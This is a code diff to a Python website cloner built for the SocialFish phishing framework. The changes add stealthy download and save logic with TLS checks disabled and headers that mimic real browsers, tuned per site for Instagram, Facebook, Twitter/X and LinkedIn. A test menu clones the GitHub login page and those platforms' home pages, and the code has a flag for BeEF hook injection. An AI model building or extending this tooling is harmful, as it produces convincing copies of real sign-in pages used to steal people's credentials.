@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-SocialFish Compatible Advanced Universal Website Cloner
+SocialFish Compatible UNIVERSAL Website Cloner
 Integrates perfectly with existing SocialFish Flask application
-Supports all modern web technologies with advanced stealth
+Supports ALL modern websites with advanced stealth and universal compatibility
 """
 
 import asyncio
@@ -28,7 +28,7 @@ from typing import Dict, List, Set, Optional, Tuple, Any, Union
 from collections import defaultdict, deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib.parse
-import urllib3
+import requests  # Add this import at the top
 from functools import wraps
 import tempfile
 import shutil
@@ -69,7 +69,11 @@ except ImportError:
     PLAYWRIGHT_AVAILABLE = False
 
 # Suppress warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+try:
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+except ImportError:
+    pass
 logging.getLogger('urllib3').setLevel(logging.WARNING)
 
 # Setup logging
@@ -246,81 +250,96 @@ class SocialFishResourceManager:
     
     async def download_resource(self, url: str, resource_type: str, 
                                referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
-        """Download resource with retry logic"""
+        """Download resource using SYNC requests in async wrapper - BULLETPROOF"""
         if url in self.downloaded_urls or url in self.failed_urls:
             return None
         
-        for attempt in range(self.config.max_retries):
-            session = random.choice(self.session_pool)
-            
-            headers = dict(session.headers)
-            if referer:
-                headers['Referer'] = referer
-            
-            # Resource-specific headers
-            if resource_type == 'css':
-                headers['Accept'] = 'text/css,*/*;q=0.1'
-            elif resource_type == 'js':
-                headers['Accept'] = '*/*'
-            elif resource_type == 'image':
-                headers['Accept'] = 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
-            elif resource_type == 'font':
-                headers['Accept'] = 'font/woff2,font/woff,*/*;q=0.1'
-            
+        # Run the EXACT working code pattern in a thread
+        import concurrent.futures
+        import threading
+        
+        def sync_download():
+            """EXACT copy of working code download pattern"""
             try:
-                async with session.get(url, headers=headers) as response:
-                    if response.status == 200:
-                        content = await response.read()
-                        content = self._decompress_content(content, response.headers)
-                        
-                        self.downloaded_urls.add(url)
-                        self.stats['downloaded'] += 1
-                        self.stats['bytes_downloaded'] += len(content)
-                        
-                        metadata = {
-                            'url': url,
-                            'content_type': response.headers.get('content-type', ''),
-                            'size': len(content),
-                            'status': response.status
-                        }
-                        
-                        return content, metadata
+                # Create session exactly like working code
+                session = requests.Session()
+                session.verify = False
+                session.timeout = 30
+                
+                # Headers like working code
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+                    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' if resource_type == 'image' else '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                }
+                
+                if referer:
+                    headers['Referer'] = referer
+                
+                # EXACT working code request
+                response = session.get(url, headers=headers, timeout=30, verify=False)
+                
+                if response.status_code == 200:
+                    # EXACT working code content handling
+                    content = response.content  # Raw bytes - this is what works!
+                    
+                    # EXACT working code decompression
+                    encoding = response.headers.get('content-encoding', '').lower()
+                    
+                    if 'br' in encoding:
+                        try:
+                            content = brotli.decompress(content)
+                        except:
+                            pass
+                    elif 'gzip' in encoding:
+                        try:
+                            content = gzip.decompress(content)
+                        except:
+                            pass
+                    elif 'deflate' in encoding:
+                        try:
+                            content = zlib.decompress(content)
+                        except:
+                            pass
+                    
+                    return content, {
+                        'url': url,
+                        'content_type': response.headers.get('content-type', ''),
+                        'size': len(content),
+                        'status': response.status_code
+                    }
+                
+                return None
+                
+            except Exception as e:
+                print(f"Download failed: {e}")
+                return None
+        
+        # Run in thread to avoid blocking async loop
+        loop = asyncio.get_event_loop()
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(sync_download)
+            try:
+                result = await loop.run_in_executor(None, sync_download)
+                
+                if result:
+                    content, metadata = result
+                    self.downloaded_urls.add(url)
+                    self.stats['downloaded'] += 1
+                    self.stats['bytes_downloaded'] += len(content)
+                    return content, metadata
+                else:
+                    self.failed_urls.add(url)
+                    self.stats['failed'] += 1
+                    return None
                     
             except Exception as e:
-                logger.debug(f"Attempt {attempt + 1} failed for {url}: {e}")
-                
-            if attempt < self.config.max_retries - 1:
-                await asyncio.sleep(self.config.retry_delay * (attempt + 1))
-        
-        self.failed_urls.add(url)
-        self.stats['failed'] += 1
-        return None
-    
-    def _decompress_content(self, content: bytes, headers: Dict[str, str]) -> bytes:
-        """Decompress content with fallback"""
-        encoding = headers.get('content-encoding', '').lower()
-        
-        try:
-            if 'br' in encoding:
-                return brotli.decompress(content)
-            elif 'gzip' in encoding:
-                return gzip.decompress(content)
-            elif 'deflate' in encoding:
-                return zlib.decompress(content)
-        except Exception:
-            # Magic byte detection fallback
-            if content[:2] == b'\x1f\x8b':
-                try:
-                    return gzip.decompress(content)
-                except Exception:
-                    pass
-            elif content[0:1] == b'\x78':
-                try:
-                    return zlib.decompress(content)
-                except Exception:
-                    pass
-        
-        return content
+                logger.error(f"Thread execution failed: {e}")
+                self.failed_urls.add(url)
+                self.stats['failed'] += 1
+                return None
     
     async def cleanup(self):
         """Cleanup sessions"""
@@ -477,6 +496,21 @@ class SocialFishContentProcessor:
         self.config = config
         self.resource_manager = resource_manager
     
+    def _is_text_content_type(self, content_type: str, resource_type: str) -> bool:
+        """Determine if content should be treated as text"""
+        if resource_type in ['css', 'js']:
+            return True
+        
+        if not content_type:
+            return resource_type in ['css', 'js']
+        
+        text_types = [
+            'text/', 'application/javascript', 'application/x-javascript',
+            'application/json', 'application/xml'
+        ]
+        
+        return any(content_type.lower().startswith(t) for t in text_types)
+    
     async def process_html(self, html_content: str, base_url: str, 
                           output_dir: Path, beef_enabled: bool = False) -> str:
         """Process HTML with SocialFish optimizations"""
@@ -613,7 +647,7 @@ class SocialFishContentProcessor:
     async def _process_single_resource(self, semaphore: asyncio.Semaphore,
                                      resource_url: str, element: Any, attr: str,
                                      resource_type: str, base_url: str, output_dir: Path):
-        """Process a single resource"""
+        """Process a single resource using UNIVERSAL sync download"""
         async with semaphore:
             try:
                 # Resolve URL
@@ -624,62 +658,289 @@ class SocialFishContentProcessor:
                     else:
                         resource_url = urllib.parse.urljoin(base_url, resource_url)
                 
-                # Download resource
-                result = await self.resource_manager.download_resource(
-                    resource_url, resource_type, base_url
-                )
+                # Use UNIVERSAL synchronous download in thread
+                loop = asyncio.get_event_loop()
                 
-                if result:
-                    content, metadata = result
-                    local_path = await self._save_resource(
-                        content, metadata, resource_type, output_dir
-                    )
-                    
-                    if local_path and element:
-                        # Update element with local path
-                        element[attr] = local_path
+                def sync_download():
+                    return self._download_sync_universal(resource_url, output_dir, resource_type, base_url)
+                
+                # Run in thread
+                local_path = await loop.run_in_executor(None, sync_download)
+                
+                if local_path and element:
+                    # Update element with local path
+                    element[attr] = local_path
                 
             except Exception as e:
                 logger.debug(f"Resource processing failed for {resource_url}: {e}")
     
-    async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
-                           resource_type: str, output_dir: Path) -> Optional[str]:
-        """Save resource in SocialFish directory structure"""
+    def _download_sync_universal(self, url, output_dir, resource_type, base_url, referer=None):
+        """UNIVERSAL synchronous download - works for any site"""
         try:
-            # Determine file extension
-            url = metadata.get('url', '')
-            content_type = metadata.get('content_type', '')
-            extension = self._get_extension(url, content_type, resource_type)
+            import requests
             
-            # Generate filename
+            # Universal session setup
+            session = requests.Session()
+            session.verify = False
+            session.timeout = 30
+            
+            # UNIVERSAL headers that adapt to target site
+            parsed_base = urllib.parse.urlparse(base_url)
+            target_domain = parsed_base.netloc
+            
+            # Dynamic headers based on target site
+            headers = {
+                'User-Agent': self._get_appropriate_user_agent(target_domain),
+                'Accept': self._get_accept_header(resource_type),
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Referer': referer or base_url,  # Dynamic referer
+                'Sec-Fetch-Dest': self._get_fetch_dest(resource_type),
+                'Sec-Fetch-Mode': 'no-cors',
+                'Sec-Fetch-Site': self._get_fetch_site(url, base_url),
+            }
+            
+            # Remove None values
+            headers = {k: v for k, v in headers.items() if v is not None}
+            
+            # Site-specific header adjustments
+            headers.update(self._get_site_specific_headers(target_domain, resource_type))
+            
+            # Follow redirects properly
+            response = session.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True)
+            
+            if response.status_code == 200:
+                # Check if we got HTML instead of expected content
+                content_type = response.headers.get('content-type', '').lower()
+                content = response.content
+                
+                # Verify we didn't get HTML for binary resources
+                if resource_type in ['image', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
+                    logger.warning(f"Got HTML instead of {resource_type} for {url}")
+                    return None
+                
+                # Universal decompression
+                content = self._universal_decompress(content, response.headers)
+                
+                # Update stats
+                self.resource_manager.stats['downloaded'] += 1
+                self.resource_manager.stats['bytes_downloaded'] += len(content)
+                
+                # Universal save logic
+                local_path = self._universal_save(content, url, output_dir, resource_type, response.headers)
+                
+                if local_path:
+                    logger.debug(f"✅ Universal download saved: {local_path} ({len(content)} bytes)")
+                    return local_path
+            
+            return None
+            
+        except Exception as e:
+            logger.error(f"❌ Universal download failed for {url}: {e}")
+            self.resource_manager.stats['failed'] += 1
+            return None
+    
+    def _get_appropriate_user_agent(self, domain):
+        """Get appropriate user agent for target domain"""
+        # Site-specific user agents for better compatibility
+        site_agents = {
+            'facebook.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+            'instagram.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+            'twitter.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+            'x.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+            'linkedin.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+            'github.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+        }
+        
+        for site, agent in site_agents.items():
+            if site in domain:
+                return agent
+        
+        # Default modern user agent
+        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
+    
+    def _get_accept_header(self, resource_type):
+        """Get appropriate Accept header for resource type"""
+        accept_headers = {
+            'image': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+            'css': 'text/css,*/*;q=0.1',
+            'js': 'application/javascript,text/javascript,*/*;q=0.01',
+            'font': 'font/woff2,font/woff,*/*;q=0.1',
+            'json': 'application/json,*/*;q=0.1',
+        }
+        return accept_headers.get(resource_type, '*/*')
+    
+    def _get_fetch_dest(self, resource_type):
+        """Get appropriate Sec-Fetch-Dest for resource type"""
+        fetch_dest = {
+            'image': 'image',
+            'css': 'style',
+            'js': 'script',
+            'font': 'font',
+        }
+        return fetch_dest.get(resource_type, 'empty')
+    
+    def _get_fetch_site(self, url, base_url):
+        """Determine Sec-Fetch-Site based on URL relationship"""
+        try:
+            url_domain = urllib.parse.urlparse(url).netloc
+            base_domain = urllib.parse.urlparse(base_url).netloc
+            
+            if url_domain == base_domain:
+                return 'same-origin'
+            elif url_domain.endswith('.'.join(base_domain.split('.')[-2:])):
+                return 'same-site'
+            else:
+                return 'cross-site'
+        except:
+            return 'cross-site'
+    
+    def _get_site_specific_headers(self, domain, resource_type):
+        """Get site-specific headers for better compatibility"""
+        headers = {}
+        
+        # Instagram specific
+        if 'instagram.com' in domain:
+            headers.update({
+                'X-Instagram-AJAX': '1',
+                'X-Requested-With': 'XMLHttpRequest',
+            })
+        
+        # Facebook specific  
+        elif 'facebook.com' in domain:
+            headers.update({
+                'X-Requested-With': 'XMLHttpRequest',
+            })
+        
+        # Twitter/X specific
+        elif any(x in domain for x in ['twitter.com', 'x.com']):
+            headers.update({
+                'X-Requested-With': 'XMLHttpRequest',
+            })
+        
+        # LinkedIn specific
+        elif 'linkedin.com' in domain:
+            headers.update({
+                'X-Requested-With': 'XMLHttpRequest',
+            })
+        
+        return headers
+    
+    def _universal_decompress(self, content, headers):
+        """Universal decompression that works for any site"""
+        if not content:
+            return content
+            
+        encoding = headers.get('content-encoding', '').lower()
+        
+        try:
+            if 'br' in encoding:
+                return brotli.decompress(content)
+            elif 'gzip' in encoding:
+                return gzip.decompress(content)
+            elif 'deflate' in encoding:
+                return zlib.decompress(content)
+        except Exception as e:
+            logger.debug(f"Decompression failed, using raw content: {e}")
+            # Magic byte detection fallback
+            if content[:2] == b'\x1f\x8b':
+                try:
+                    return gzip.decompress(content)
+                except:
+                    pass
+            elif content[0:1] == b'\x78':
+                try:
+                    return zlib.decompress(content)
+                except:
+                    pass
+        
+        return content
+    
+    def _universal_save(self, content, url, output_dir, resource_type, headers):
+        """Universal save logic that preserves structure for any site"""
+        parsed_url = urllib.parse.urlparse(url)
+        
+        # Always try to preserve original path for images and important resources
+        if resource_type in ['image'] and parsed_url.path and parsed_url.path != '/':
+            # Keep original path structure
+            original_path = parsed_url.path.lstrip('/')
+            file_path = output_dir / original_path
+            file_path.parent.mkdir(parents=True, exist_ok=True)
+            local_path = original_path
+        else:
+            # Hash-based naming for other resources
             url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
+            extension = self._get_extension(url, headers.get('content-type', ''), resource_type)
             filename = f"resource_{url_hash}{extension}"
-            
-            # Create subdirectory
             subdir = self._get_subdir(resource_type)
             resource_dir = output_dir / subdir
             resource_dir.mkdir(exist_ok=True)
-            
-            # Save file
             file_path = resource_dir / filename
+            local_path = f"{subdir}/{filename}"
+        
+        # Universal binary save (works for all sites)
+        with open(file_path, 'wb') as f:
+            f.write(content)
+        
+        return local_path
+    
+    async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
+                           resource_type: str, output_dir: Path) -> Optional[str]:
+        """Save resource with SIMPLE binary/text handling - no async file ops for binary"""
+        try:
+            url = metadata.get('url', '')
+            content_type = metadata.get('content_type', '')
+            extension = self._get_extension(url, content_type, resource_type)
+            parsed_url = urllib.parse.urlparse(url)
             
-            # Handle text vs binary content
-            if resource_type in ['css', 'js']:
-                # Text content
-                if isinstance(content, bytes):
-                    content = content.decode('utf-8', errors='ignore')
-                
-                async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
-                    await f.write(content)
+            # Validate content
+            if not content:
+                logger.warning(f"Empty content for {url}")
+                return None
+            
+            # Determine save path - preserve structure for images
+            if resource_type == 'image' and parsed_url.path and parsed_url.path != '/':
+                original_path = parsed_url.path.lstrip('/')
+                file_path = output_dir / original_path
+                file_path.parent.mkdir(parents=True, exist_ok=True)
+                local_path = original_path
             else:
-                # Binary content
-                async with aiofiles.open(file_path, 'wb') as f:
-                    await f.write(content)
+                url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
+                filename = f"resource_{url_hash}{extension}"
+                subdir = self._get_subdir(resource_type)
+                resource_dir = output_dir / subdir
+                resource_dir.mkdir(exist_ok=True)
+                file_path = resource_dir / filename
+                local_path = f"{subdir}/{filename}"
             
-            return f"{subdir}/{filename}"
+            # SIMPLE FIX: Use regular file operations like the working code
+            is_text = self._is_text_content_type(content_type, resource_type)
+            
+            if is_text:
+                # Text content - decode and save
+                try:
+                    text_content = content.decode('utf-8', errors='ignore')
+                    with open(file_path, 'w', encoding='utf-8') as f:
+                        f.write(text_content)
+                except Exception as e:
+                    logger.error(f"Text save failed for {url}: {e}")
+                    return None
+            else:
+                # Binary content - EXACTLY like working code
+                with open(file_path, 'wb') as f:
+                    f.write(content)  # Direct binary write, no async
+            
+            # Verify file
+            if not file_path.exists() or file_path.stat().st_size == 0:
+                logger.error(f"File not written: {file_path}")
+                return None
+            
+            logger.debug(f"Saved {resource_type}: {file_path} ({len(content)} bytes)")
+            return local_path
             
         except Exception as e:
-            logger.error(f"Failed to save resource: {e}")
+            logger.error(f"Save failed for {url}: {e}")
             return None
     
     def _get_extension(self, url: str, content_type: str, resource_type: str) -> str:
@@ -698,15 +959,19 @@ class SocialFishContentProcessor:
         extensions = {
             'text/css': '.css',
             'application/javascript': '.js',
+            'text/javascript': '.js',
             'image/jpeg': '.jpg',
             'image/png': '.png',
             'image/gif': '.gif',
             'image/svg+xml': '.svg',
+            'image/webp': '.webp',
             'font/woff2': '.woff2',
-            'font/woff': '.woff'
+            'font/woff': '.woff',
+            'application/font-woff': '.woff',
+            'application/font-woff2': '.woff2'
         }
         
-        return extensions.get(content_type.split(';')[0], '.bin')
+        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
     
     def _get_subdir(self, resource_type: str) -> str:
         """Get subdirectory for resource type"""
@@ -852,7 +1117,7 @@ class SocialFishCloner:
             return None
     
     async def _get_page_content(self, url: str) -> Optional[str]:
-        """Get page content using best available method"""
+        """Get page content using best available method - FIXED: No double decompression"""
         # Try browser rendering first
         if self.browser_manager.driver:
             content = await self.browser_manager.render_page(url)
@@ -865,10 +1130,10 @@ class SocialFishCloner:
             try:
                 async with session.get(url) as response:
                     if response.status == 200:
+                        # CRITICAL FIX: aiohttp automatically decompresses
                         content = await response.read()
-                        content = self.resource_manager._decompress_content(content, response.headers)
                         
-                        # Decode text
+                        # Decode text for HTML content only (no manual decompression needed)
                         for encoding in ['utf-8', 'latin-1', 'iso-8859-1']:
                             try:
                                 return content.decode(encoding)
@@ -968,15 +1233,51 @@ def clone(url: str, user_agent: str, beef: str) -> bool:
         logger.error(f"❌ SocialFish clone error: {e}")
         return False
 
-# Test function for standalone usage
+# Test function for universal usage
 if __name__ == "__main__":
-    test_url = "https://github.com/login"
+    test_sites = [
+        ("https://github.com/login", "GitHub"),
+        ("https://www.instagram.com/", "Instagram"),
+        ("https://www.facebook.com/", "Facebook"),
+        ("https://twitter.com/", "Twitter"),
+        ("https://www.linkedin.com/", "LinkedIn")
+    ]
+    
     test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
     
-    logger.info("🧪 Testing SocialFish compatible cloner...")
-    result = clone(test_url, test_user_agent, "no")
+    print("🧪 Testing UNIVERSAL SocialFish cloner...")
+    print("Select a site to test:")
+    for i, (url, name) in enumerate(test_sites, 1):
+        print(f"{i}. {name} ({url})")
     
-    if result:
-        logger.info("🎉 Test completed successfully!")
-    else:
-        logger.error("❌ Test failed!")
+    try:
+        choice = int(input("Enter choice (1-5): ")) - 1
+        if 0 <= choice < len(test_sites):
+            test_url, site_name = test_sites[choice]
+            print(f"🚀 Testing {site_name}...")
+            result = clone(test_url, test_user_agent, "no")
+            
+            if result:
+                print(f"🎉 {site_name} clone completed successfully!")
+            else:
+                print(f"❌ {site_name} clone failed!")
+        else:
+            # Default test
+            test_url = test_sites[0][0]
+            print(f"🚀 Running default test: {test_sites[0][1]}...")
+            result = clone(test_url, test_user_agent, "no")
+            
+            if result:
+                print("🎉 Test completed successfully!")
+            else:
+                print("❌ Test failed!")
+    except (ValueError, KeyboardInterrupt):
+        # Default test
+        test_url = test_sites[0][0]
+        print(f"🚀 Running default test: {test_sites[0][1]}...")
+        result = clone(test_url, test_user_agent, "no")
+        
+        if result:
+            print("🎉 Test completed successfully!")
+        else:
+            print("❌ Test failed!")
